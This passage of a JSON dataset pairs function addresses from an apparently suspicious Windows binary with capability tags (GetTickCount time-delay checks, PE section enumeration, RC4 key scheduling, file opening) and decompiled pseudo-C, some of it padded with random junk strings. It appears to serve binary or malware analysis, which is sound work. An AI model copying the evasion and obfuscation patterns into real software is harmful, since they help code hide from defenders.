        "decompiled_code": "\nint32_t fcn.004a3bc0(int32_t param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    int32_t *piVar5;\n    uint32_t uStack120;\n    uint uStack76;\n    uint uStack44;\n    int32_t iStack40;\n    \n    iVar1 = fcn.004a3950();\n    *(iVar1 + 4) = *(iVar1 + 4) + 1;\n    *(param_1 + -0x60) = 0;\n    *(param_1 + -0x50) = param_2;\n    *(param_1 + -0x4c) = param_3;\n    uVar2 = fcn.0049df50();\n    *(param_1 + -0x48) = uVar2;\n    uVar2 = fcn.0049d930();\n    *(param_1 + -0x20) = 0x432b2b00;\n    *(param_1 + -0x44) = uVar2;\n    *(param_1 + -0x1c) = 0x474e5543;\n    *(param_1 + -0x18) = 0x4288b0;\n    *(param_1 + -0x60) = 1;\n    fcn.0041b160();\n    fcn.004a36d0();\n    fcn.004a0230();\n    puVar3 = fcn.004a3610();\n    *puVar3 = 0x50b088;\n    fcn.004a3bc0();\n    piVar5 = *(*0x50747c + -8) + 0x50747c;\n    if (*(*piVar5 + -4) == *(*0x50747c + -4)) {\n        iVar1 = iStack40;\n        (**(**(*0x50747c + -4) + 0x1c))(iStack40, 6, uStack44, piVar5);\n        if ((uStack120 & 6) == 6) {\n            return 0x48c2d0;\n        }\n        if (uStack120 == 0) {\n            if (iStack40 < 0) {\n                if ((iStack40 != -2) &&\n                   (uVar4 = (**(*(param_1 + -0x20) + 0x20))(iStack40, 0x48c2d0, uStack76, 0x50747c),  (uVar4 & 6) == 6))\n                {\n                    return iVar1;\n                }\n            }\n            else if (iStack40 == 0x7b1ac) {\n                return 0x48c2d0;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 636
    },
    "004015ea": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004015ea(char *arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    uint32_t uVar3;\n    char *pcVar4;\n    uint32_t var_1ch;\n    uint var_ch;\n    \n    *in_ECX = in_ECX + 2;\n    uVar3 = 0xffffffff;\n    pcVar4 = arg_8h;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    var_1ch = ~uVar3 - 1;\n    pcVar4 = arg_8h + var_1ch;\n    if (0xf < var_1ch) {\n        iVar2 = fcn.004927b0(&var_1ch, 0);\n        *in_ECX = iVar2;\n        in_ECX[2] = var_1ch;\n    }\n    fcn.00490e30(*in_ECX, arg_8h, pcVar4);\n    in_ECX[1] = var_1ch;\n    *(*in_ECX + var_1ch) = 0;\n    return;\n}\n",
        "token_count": 315
    },
    "004026fe": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004026fe(char *arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    uint32_t uVar3;\n    char *pcVar4;\n    uint32_t var_1ch;\n    uint var_ch;\n    \n    *in_ECX = in_ECX + 2;\n    uVar3 = 0xffffffff;\n    pcVar4 = arg_8h;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    var_1ch = ~uVar3 - 1;\n    pcVar4 = arg_8h + var_1ch;\n    if (0xf < var_1ch) {\n        iVar2 = fcn.004927b0(&var_1ch, 0);\n        *in_ECX = iVar2;\n        in_ECX[2] = var_1ch;\n    }\n    fcn.00490e30(*in_ECX, arg_8h, pcVar4);\n    in_ECX[1] = var_1ch;\n    *(*in_ECX + var_1ch) = 0;\n    return;\n}\n",
        "token_count": 315
    },
    "00418950": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t fcn.00418950(void)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    uint *puVar2;\n    uint32_t uStack8;\n    \n    puVar2 = &stack0x00000004;\n    uVar1 = in_EAX;\n    if (0xfff < in_EAX) {\n        do {\n            puVar2 = puVar2 + -0x400;\n            *puVar2 = *puVar2;\n            uVar1 = uVar1 - 0x1000;\n        } while (0x1000 < uVar1);\n    }\n    uStack8 = in_EAX;\n    *(puVar2 - uVar1) = *(puVar2 - uVar1);\n    return uStack8;\n}\n",
        "token_count": 172
    },
    "00431a50": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid __cdecl fcn.00431a50(int32_t *arg_8h, uint arg_ch)\n\n{\n    uint *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_bp_4h;\n    \n    (**(*arg_8h + 0x10))(arg_8h, arg_ch);\n    fcn.00470f50(var_20h, var_1ch);\n    if (var_20h != &var_18h) {\n        fcn.004a34c0(var_20h);\n    }\n    return;\n}\n",
        "token_count": 147
    },
    "004726b0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nuint fcn.004726b0(uint param_1, int32_t *param_2, uint param_3, uint param_4, uchar param_5, uint param_6, \n                 ushort param_7, unkbyte10 param_8, int32_t *param_9)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *extraout_ECX;\n    uint var_40h;\n    uint var_3ch;\n    uint var_30h_5;\n    uint var_28h_2;\n    uint32_t in_stack_ffffff9c;\n    uint var_1ch_5;\n    uint var_20h_3;\n    uchar *var_30h_4;\n    uchar auStack44 [28];\n    \n    if (param_9 == NULL) {\n        uVar3 = (**(*param_2 + 8))(param_3, param_4, param_5, param_6, param_7, param_8);\n        return uVar3;\n    }\n    if (param_9[6] != 0) {\n        var_30h_4 = auStack44;\n        fcn.00493990(*param_9, *param_9 + param_9[1] * 2, in_stack_ffffff9c & 0xffffff00);\n        uVar3 = (**(*param_2 + 0xc))(param_3, param_4, param_5, param_6, param_7, &var_30h_4);\n        if (var_30h_4 != auStack44) {\n            fcn.004a34c0(var_30h_4);\n        }\n        return uVar3;\n    }\n    uVar3 = fcn.0049eb30(\"uninitialized __any_string\");\n    if (var_30h_4 != auStack44) {\n        fcn.004a34c0(var_30h_4);\n    }\n    fcn.0041b360(uVar3);\n    iVar4 = *0x4f59f4;\n    *extraout_ECX = 0x509df0;\n    piVar2 = extraout_ECX[3];\n    if (iVar4 == 0) {\n        iVar4 = piVar2[1];\n        piVar2[1] = iVar4 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = piVar2 + 1;\n        iVar4 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar4 == 1) {\n        (**(*piVar2 + 4))();\n    }\n    *extraout_ECX = 0x50b370;\n    fcn.0048f350(extraout_ECX + 2);\n    fcn.0048f380();\n    uVar3 = fcn.004a34c0(extraout_ECX);\n    return uVar3;\n}\n",
        "token_count": 658
    },
    "00474460": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nvoid __cdecl\nfcn.00474460(uint noname_0, int32_t *arg_ch, int32_t *arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, int32_t arg_20h\n            , int32_t arg_24h)\n\n{\n    uint *var_48h;\n    uint var_40h;\n    uint *var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_bp_ch;\n    \n    var_48h = &var_40h;\n    fcn.00493990(arg_20h, arg_20h + arg_24h * 2, 0);\n    (**(*arg_ch + 0xc))(arg_ch, arg_14h, arg_18h, arg_1ch, &var_48h);\n    if (arg_10h[6] != NULL) {\n        (*arg_10h[6])(arg_10h);\n    }\n    *arg_10h = arg_10h + 2;\n    fcn.00493a40(var_30h, var_30h + var_2ch * 2, 0);\n    arg_10h[6] = 0x4740a0;\n    if (var_30h != &var_28h) {\n        fcn.004a34c0(var_30h);\n    }\n    if (var_48h != &var_40h) {\n        fcn.004a34c0(var_48h);\n    }\n    return;\n}\n",
        "token_count": 361
    },
    "00474b50": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid __cdecl fcn.00474b50(uint noname_0, int32_t *arg_ch, int32_t *arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint32_t uVar1;\n    uint *var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_bp_4h;\n    \n    uVar1 = 0x474b76;\n    (**(*arg_ch + 0xc))(arg_ch, arg_14h, arg_18h);\n    if (arg_10h[6] != NULL) {\n        (*arg_10h[6])(arg_10h);\n    }\n    *arg_10h = arg_10h + 2;\n    fcn.00493a40(var_20h, var_20h + var_1ch * 2, uVar1 & 0xffffff00);\n    arg_10h[6] = 0x4740a0;\n    if (var_20h != &fcn.00474b50::var_18h) {\n        fcn.004a34c0(var_20h);\n    }\n    return;\n}\n",
        "token_count": 278
    },
    "00409170": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nvoid __fastcall fcn.00409170(uint param_1)\n\n{\n    uint uVar1;\n    uint extraout_EDX;\n    char *pcVar2;\n    uint var_60h;\n    uint var_48h;\n    uint var_30h;\n    uint var_bp_ch;\n    \n    fcn.004026fe(\"mruippuqcrbqodjvpqiwbbbclpme\");\n    uVar1 = fcn.00408f9c(&var_30h);\n    fcn.004906c0(uVar1);\n    uVar1 = fcn.004026fe(\"aesoirtugsxpwtwwtkdtocgxyobetqhvjhjahxfifdnbzgpecszhsdmyzm\");\n    fcn.004906c0(uVar1);\n    fcn.004026fe(0x4fdd99);\n    fcn.004026fe(\"gnyyehchanflpsmjngegjxqekiwsthyrmbxgkobwkltezu\");\n    fcn.004026fe(\"nxlmlcmbtko\");\n    fcn.004906c0();\n    fcn.004906c0();\n    fcn.004906c0();\n    fcn.004026fe(\"fckuyhytjfqdkoip\");\n    fcn.004026fe(\"cklufsuxlkrtqrcdkilfljfygagteqfwbsfxrwfewtxcpwslnbwqcluedzesziszgnmszmjjjzvjs\");\n    fcn.004026fe(\"pbnuszyehlzwycwvgekrgrrmdckaijdffzejbqoirvexneoottfifam\");\n    fcn.00408fee();\n    fcn.004906c0();\n    fcn.004906c0();\n    fcn.004906c0();\n    fcn.004026fe(\"ktbooakzpviorhkyeusojkvhznqjjiegxdmxcqhtizagbwexwlyrlfaerhmuccifldbdyrlibpmlphzxmfdprvzttwboh\");\n    fcn.00409064(0, &var_30h, 0x8b6, 0, *0x501d2c, *0x501d28, *0x501d24);\n    fcn.004906c0();\n    fcn.004090fc();\n    fcn.004026fe(\"olmsgveqdmoxhgghmbwfxwgxhiyhydtfslrnswhjabxyrlmmnrwadsmqysuahvgtpyduaroxvgsrwlbbnx\");\n    fcn.004906c0();\n    fcn.004026fe(\"gqfjxil\");\n    fcn.00408cf4(*0x501d34, 0x48f, *0x501d30, &var_30h);\n    fcn.004906c0();\n    fcn.004026fe(\"jswrytsaxsunjqesvaubpwexvagpc\");\n    fcn.00408ddc(0x1e4, *0x501d3c, &var_30h, *0x501d38, 0, 1, 0x27);\n    fcn.004906c0();\n    fcn.004026fe(\"cvjeiwukhbvacgudzkdkuopsefxlvzjfnharxorrszdjdqqqmmlvrcabarqcboqkotifrjhnwztfs\");\n    fcn.004906c0();\n    fcn.004026fe(\"malvzzspdbottdltbnrdyvtepwzqhwdkrycyvhfndxbgtpjmupzwgmcoveyvnluymkwmpwlacnqyxgorsjxdepkafyo\");\n    fcn.00408e7c(0x132c, *0x501d44, *0x501d40, &var_30h);\n    fcn.004906c0();\n    fcn.00408ef6(0);\n    fcn.004026fe(\"pwofq\");\n    fcn.00408f18(&var_30h);\n    fcn.004906c0();\n    pcVar2 = \"mqcibdapzzqwjadfaivoxapxygwkuaszstaamwwnkgnxcwtdpkkncfpirbpqlnprkwnhwjbohtlel\";\n    fcn.004026fe(\"mqcibdapzzqwjadfaivoxapxygwkuaszstaamwwnkgnxcwtdpkkncfpirbpqlnprkwnhwjbohtlel\");\n    fcn.004906c0();\n    fcn.00408b82(1, pcVar2);\n    fcn.00408c1a(param_1, *0x501d48, 1);\n    fcn.004906c0();\n    fcn.004026fe(\"dxngcvdjhaivbrmssviyldpeusgodqtdurznhbfkrqptrkavjxmznqto\");\n    fcn.004026fe(\"fafhiajitxnhmgqodgfyppgiywmwuojqrfigfehvtrrpnnl\");\n    fcn.004906c0(extraout_EDX);\n    fcn.004906c0();\n    fcn.004026fe(\"hqlrjnhdimgmvevhjjptkkuqolemzcwxozv\");\n    uVar1 = fcn.004026fe(\"xbdqpknscgypdnyrtkfaanzdedzchzwppuzgcvfsmkjnfjpxjgmvciecsewnjfwygprffmzbzomgmgei\");\n    fcn.004906c0(uVar1);\n    fcn.004906c0();\n    return;\n}\n",
        "token_count": 1319
    },
    "0040b720": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nvoid fcn.0040b720(void)\n\n{\n    uint uVar1;\n    uint extraout_ECX;\n    uint var_6ch;\n    uint var_60h;\n    uint var_48h;\n    uint var_30h;\n    uint var_bp_ch;\n    \n    fcn.004026fe(\"zolclzirxpteheqhssolcdgigjreiwyhfuujvahtfapbrbdzlvqclfscirotalcznqawievpyascvrvmhmyvsolsbfkpmkdag\");\n    uVar1 = fcn.004026fe(\n                        \"sakeundckbdvlancbtqrhwevdhuztkdhxifwneshsykyoigrkpwpwfqmojgdyiyxsgqjoighcuxryzgbxiqlpwstrjqexo\"\n                        );\n    fcn.004906c0(uVar1);\n    fcn.004906c0();\n    fcn.004026fe(\"blpttiujmomsdsbensznhqujzuybmrglcysakpqdligjtn\");\n    fcn.004026fe(\"psuttymxtjtrenodgdlltxkajctzhhvwuhmagfrszzbgsgktmzojjqq\");\n    fcn.004906c0(extraout_ECX);\n    fcn.004906c0();\n    fcn.004026fe(\"vttvqiorcdbwtfwbialgawumkhiyrocmsipucobtlvvpqlshcuipbmpd\");\n    fcn.004026fe(\"ltbykgstcnsusheezclhestoigafyfsfigcjllfcxrvvaaqdayadjgvxbomiiueyxmvwljchtyuucdbw\");\n    fcn.0040b470(0, 1, &var_48h, 1, &var_30h, *0x501df4);\n    fcn.004906c0();\n    fcn.004906c0();\n    fcn.004026fe(\"trukchuuzsmywaijtyykhjbmqlqbqfqdswprmhrsfmjnaiuxepofuykxaagnrpibppymnprtpql\");\n    uVar1 = fcn.004026fe(\"aokdaarlxtwwdogmjazarhvnqfhxrplcdhrfmuexfmgkffsxusbjjixpeiyenpqcgtcmetwryel\");\n    fcn.004906c0(uVar1);\n    fcn.004906c0();\n    fcn.004026fe(0x4ffcb7);\n    fcn.004026fe(\"kquhwldnz\");\n    fcn.004906c0();\n    fcn.004906c0();\n    fcn.004026fe(\"vjoxbopouwupkxgquekfnavguorfwrzupclvbtcletnuykoyuzssayocwswbijhoopelcrfti\");\n    fcn.004026fe(\"nspdybpdxfflnbhiemekbvqskkbqehwozugwbalhhbbtleazbsloqoukuxgjqeyclodgfxausqioogmejmhknnkamnlfty\");\n    fcn.004906c0();\n    fcn.004906c0();\n    fcn.004026fe(\"vtegfqyrjlwxcszjddxiagepenwfwlgevqlcipehikqzdwaygzhgvgzbmlanocfeqmenjvaeelicmclmpoxthxi\");\n    fcn.0040b53a();\n    fcn.004906c0();\n    fcn.004026fe(\"tqmgarzewrkoxvdtknqclfapdbdpofwgqiajsakvmbhqrxkaokuxylkntampvrwpagvjinvkowbnvvledfsld\");\n    fcn.004026fe(\"haakvxmuaibwicoqpdgmtntgureuoruxnyervifvmodabdrylvgoqzdpzioovspbcxiaxvrrsxkfuwn\");\n    fcn.004026fe(\"fhokdtglkyezmiicmzeenvnterscurdqaaclmkkfmcswwtbmhqhewpcmyhjymcmznmvimxlncmgjolxbdtwunraswoadvlurr\");\n    fcn.0040b5dc(0x6e2, *0x501e00, &var_60h, &var_48h, 0, &var_30h, 0x29c, *0x501dfc);\n    fcn.004906c0();\n    fcn.004906c0();\n    fcn.004906c0();\n    fcn.0040b632(*0x501e04, 0x218, 0x75d);\n    return;\n}\n",
        "token_count": 1103
    },
    "004290a0": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004290a0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    char cVar2;\n    uint *in_ECX;\n    uint var_ch;\n    \n    fcn.004786e0();\n    *in_ECX = 0x509cb4;\n    fcn.00470d20(arg_8h, arg_ch);\n    cVar2 = fcn.0042ea40();\n    if (cVar2 == '\\0') {\n        return;\n    }\n    in_ECX[0xc] = arg_ch;\n    in_ECX[0x11] = arg_10h;\n    fcn.00476e40();\n    in_ECX[5] = 0;\n    *(in_ECX + 0x49) = 0;\n    uVar1 = in_ECX[0x10];\n    in_ECX[4] = 0;\n    in_ECX[1] = uVar1;\n    in_ECX[2] = uVar1;\n    in_ECX[3] = uVar1;\n    in_ECX[6] = 0;\n    return;\n}\n",
        "token_count": 271
    },
    "00429200": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00429200(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    char cVar2;\n    uint *in_ECX;\n    uint var_ch;\n    \n    fcn.004786e0();\n    *in_ECX = 0x509cb4;\n    fcn.00470d20(arg_8h, arg_ch);\n    cVar2 = fcn.0042ea40();\n    if (cVar2 == '\\0') {\n        return;\n    }\n    in_ECX[0xc] = arg_ch;\n    in_ECX[0x11] = arg_10h;\n    fcn.00476e40();\n    in_ECX[5] = 0;\n    *(in_ECX + 0x49) = 0;\n    uVar1 = in_ECX[0x10];\n    in_ECX[4] = 0;\n    in_ECX[1] = uVar1;\n    in_ECX[2] = uVar1;\n    in_ECX[3] = uVar1;\n    in_ECX[6] = 0;\n    return;\n}\n",
        "token_count": 270
    },
    "00429430": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00429430(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    char cVar2;\n    uint *in_ECX;\n    uint var_ch;\n    \n    fcn.0047a6c0();\n    *in_ECX = 0x509cf4;\n    fcn.00470d20(arg_8h, arg_ch);\n    cVar2 = fcn.0042ea40();\n    if (cVar2 == '\\0') {\n        return;\n    }\n    in_ECX[0xc] = arg_ch;\n    in_ECX[0x11] = arg_10h;\n    fcn.00478dd0();\n    in_ECX[5] = 0;\n    *(in_ECX + 0x49) = 0;\n    uVar1 = in_ECX[0x10];\n    in_ECX[4] = 0;\n    in_ECX[1] = uVar1;\n    in_ECX[2] = uVar1;\n    in_ECX[3] = uVar1;\n    in_ECX[6] = 0;\n    return;\n}\n",
        "token_count": 272
    },
    "00429590": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00429590(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    char cVar2;\n    uint *in_ECX;\n    uint var_ch;\n    \n    fcn.0047a6c0();\n    *in_ECX = 0x509cf4;\n    fcn.00470d20(arg_8h, arg_ch);\n    cVar2 = fcn.0042ea40();\n    if (cVar2 == '\\0') {\n        return;\n    }\n    in_ECX[0xc] = arg_ch;\n    in_ECX[0x11] = arg_10h;\n    fcn.00478dd0();\n    in_ECX[5] = 0;\n    *(in_ECX + 0x49) = 0;\n    uVar1 = in_ECX[0x10];\n    in_ECX[4] = 0;\n    in_ECX[1] = uVar1;\n    in_ECX[2] = uVar1;\n    in_ECX[3] = uVar1;\n    in_ECX[6] = 0;\n    return;\n}\n",
        "token_count": 272
    },
    "0042ee40": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_8h\n\nvoid __cdecl fcn.0042ee40(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t *arg_18h)\n\n{\n    uint uVar1;\n    uint32_t in_stack_ffffffb4;\n    uchar var_25h;\n    uint var_24h;\n    uint var_20h;\n    code *pcStack32;\n    code *var_ch;\n    uint var_bp_8h;\n    \n    var_ch = NULL;\n    fcn.00474220(in_stack_ffffffb4 & 0xffffff00, *(arg_8h + 0x10), &var_24h, arg_ch, arg_10h, arg_14h, *arg_18h, \n                 *(*arg_18h + -0xc));\n    if (var_ch != NULL) {\n        fcn.0046d650(var_24h, var_20h, &var_25h);\n        if (var_ch != NULL) {\n            (*var_ch)(&var_24h);\n        }\n        return;\n    }\n    uVar1 = fcn.0049eb30(0x5020d8);\n    if (var_ch != NULL) {\n        (*var_ch)(&var_24h);\n    }\n    fcn.0041b360(uVar1);\n    if (var_ch != NULL) {\n        (*var_ch)(&var_24h);\n    }\n    fcn.0041b360(uVar1);\n    fcn.0046bf80(&stack0xffffffbf);\n    if (pcStack32 != NULL) {\n        (*pcStack32)(uVar1);\n    }\n    fcn.0041b360(&var_24h);\n    fcn.004640c0(&stack0xffffffbf);\n    if (pcStack32 != NULL) {\n        (*pcStack32)();\n    }\n    fcn.0041b360(uVar1);\n    fcn.0048f380();\n    fcn.004a34c0(uVar1);\n    fcn.0041b360(&var_24h);\n    fcn.0048f380();\n    fcn.004a34c0(uVar1);\n    fcn.0041b360(&var_24h);\n    fcn.0048f380();\n    do {\n        fcn.004a34c0(uVar1);\n        fcn.0041b360(&var_24h);\n        fcn.004a34c0(uVar1);\n        fcn.0041b360(&var_24h);\n        fcn.00433e60();\n        fcn.0046e880();\n    } while( true );\n}\n",
        "token_count": 600
    },
    "0042efc0": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_8h\n\nvoid __cdecl fcn.0042efc0(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint *arg_18h)\n\n{\n    uint uVar1;\n    int32_t *in_ECX;\n    uint32_t in_stack_ffffffb4;\n    uint *puVar2;\n    int32_t var_24h;\n    int32_t var_20h;\n    code *pcStack32;\n    code *var_ch;\n    uint var_bp_8h;\n    \n    var_ch = NULL;\n    puVar2 = &var_24h;\n    fcn.00474310(in_stack_ffffffb4 & 0xffffff00, *(arg_8h + 0x10), &var_24h, arg_ch, arg_10h, arg_14h, *arg_18h, \n                 arg_18h[1]);\n    if (var_ch != NULL) {\n        *in_ECX = in_ECX + 2;\n        fcn.00493990(var_24h, var_24h + var_20h * 2, puVar2 & 0xffffff00);\n        if (var_ch != NULL) {\n            (*var_ch)(&var_24h);\n        }\n        return;\n    }\n    uVar1 = fcn.0049eb30(\"uninitialized __any_string\");\n    if (var_ch != NULL) {\n        (*var_ch)(&var_24h);\n    }\n    fcn.0041b360(uVar1);\n    if (pcStack32 != NULL) {\n        (*pcStack32)(&var_24h);\n    }\n    fcn.0041b360(uVar1);\n    if (pcStack32 != NULL) {\n        (*pcStack32)(&var_24h);\n    }\n    fcn.0041b360(uVar1);\n    fcn.0048f380();\n    fcn.004a34c0(uVar1);\n    fcn.0041b360(&var_24h);\n    fcn.0048f380();\n    fcn.004a34c0(uVar1);\n    fcn.0041b360(&var_24h);\n    fcn.0048f380();\n    do {\n        fcn.004a34c0(uVar1);\n        fcn.0041b360(&var_24h);\n        fcn.004a34c0(uVar1);\n        fcn.0041b360(&var_24h);\n        fcn.00433e60();\n        fcn.0048fe90();\n    } while( true );\n}\n",
        "token_count": 586
    },
    "0042f070": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_8h\n\nvoid __cdecl fcn.0042f070(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t *arg_18h)\n\n{\n    uint uVar1;\n    uint32_t in_stack_ffffffb4;\n    uchar var_25h;\n    uint var_24h;\n    uint var_20h;\n    code *pcStack32;\n    code *var_ch;\n    uint var_bp_8h;\n    \n    var_ch = NULL;\n    fcn.00474460(in_stack_ffffffb4 & 0xffffff00, *(arg_8h + 0x10), &var_24h, arg_ch, arg_10h, arg_14h, *arg_18h, \n                 *(*arg_18h + -0xc));\n    if (var_ch != NULL) {\n        fcn.004658c0(var_24h, var_20h, &var_25h);\n        if (var_ch != NULL) {\n            (*var_ch)(&var_24h);\n        }\n        return;\n    }\n    uVar1 = fcn.0049eb30(0x5020d8);\n    if (var_ch != NULL) {\n        (*var_ch)(&var_24h);\n    }\n    fcn.0041b360(uVar1);\n    fcn.0046bf80(&stack0xffffffbf);\n    if (pcStack32 != NULL) {\n        (*pcStack32)(uVar1);\n    }\n    fcn.0041b360(&var_24h);\n    fcn.004640c0(&stack0xffffffbf);\n    if (pcStack32 != NULL) {\n        (*pcStack32)();\n    }\n    fcn.0041b360(uVar1);\n    fcn.0048f380();\n    fcn.004a34c0(uVar1);\n    fcn.0041b360(&var_24h);\n    fcn.0048f380();\n    fcn.004a34c0(uVar1);\n    fcn.0041b360(&var_24h);\n    fcn.0048f380();\n    do {\n        fcn.004a34c0(uVar1);\n        fcn.0041b360(&var_24h);\n        fcn.004a34c0(uVar1);\n        fcn.0041b360(&var_24h);\n        fcn.00433e60();\n        fcn.0046e880();\n    } while( true );\n}\n",
        "token_count": 566
    },
    "00430420": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint __cdecl fcn.00430420(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t *arg_1ch)\n\n{\n    uint uVar1;\n    int32_t in_ECX;\n    uint32_t in_stack_ffffff78;\n    uint32_t in_stack_ffffff8c;\n    uint var_40h;\n    uint var_3ch;\n    uint *var_34h;\n    uint var_2ch;\n    code *var_1ch;\n    uint var_bp_ch;\n    \n    var_1ch = NULL;\n    var_34h = &var_2ch;\n    fcn.00493a40(*arg_1ch, *arg_1ch + arg_1ch[1] * 2, in_stack_ffffff8c & 0xffffff00);\n    var_1ch = 0x4740a0;\n    uVar1 = fcn.00472570(in_stack_ffffff78 & 0xffffff00, *(in_ECX + 8), arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, 0, \n                         &var_34h);\n    if (var_1ch != NULL) {\n        (*var_1ch)(&var_34h);\n    }\n    return uVar1;\n}\n",
        "token_count": 316
    },
    "0041e390": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.0041e390(void)\n\n{\n    // WARNING: Could not recover jumptable at 0x00427930. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.msvcrt.dll_fopen)();\n    return;\n}\n",
        "token_count": 61
    },
    "00427930": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.00427930(void)\n\n{\n    // WARNING: Could not recover jumptable at 0x00427930. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.msvcrt.dll_fopen)();\n    return;\n}\n",
        "token_count": 60
    },
    "0040e750": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0040e750(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if ((in_EAX == NULL) || (*in_EAX != 0x2f)) {\n        return NULL;\n    }\n    if (param_2 < 1) {\n        if (param_2 != 0) {\n            return NULL;\n        }\n    }\n    else {\n        do {\n            in_EAX = in_EAX[3];\n            param_2 = param_2 + -1;\n            if (in_EAX == NULL) {\n                return in_EAX;\n            }\n            if (*in_EAX != 0x2f) {\n                return NULL;\n            }\n        } while (param_2 != 0);\n    }\n    return in_EAX[2];\n}\n",
        "token_count": 184
    },
    "0040e790": {
        "rules": [
            "contain loop"
        ],
